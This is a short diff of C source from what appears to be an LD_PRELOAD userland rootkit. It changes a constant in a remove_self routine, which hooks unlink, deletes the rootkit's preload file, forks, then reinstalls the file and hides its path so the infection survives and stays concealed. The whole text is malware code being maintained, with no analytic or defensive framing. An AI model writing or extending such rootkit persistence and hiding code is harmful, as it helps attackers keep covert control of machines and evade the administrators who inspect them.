@@ -4,7 +4,7 @@ int remove_self(void){
     /* rm our preload file so that new processes henceforth
      * are clean processes. */
     hook(CUNLINK);
-    call(CUNLINK, LDSO_PRELOAD);
+    call(CUNLINK, PRELOAD_FILE);
 
     pid_t pid;
     if((pid = fork()) == -1) return VFORK_ERR;   /* if we can't fork, return error */
@@ -13,7 +13,7 @@ int remove_self(void){
     /* continue in the parent process */
     wait(NULL);
     reinstall();               /* rewrite our preload file */
-    hide_path(LDSO_PRELOAD);   /* and hide it */
+    hide_path(PRELOAD_FILE);   /* and hide it */
     return VEVADE_DONE;
 }
 
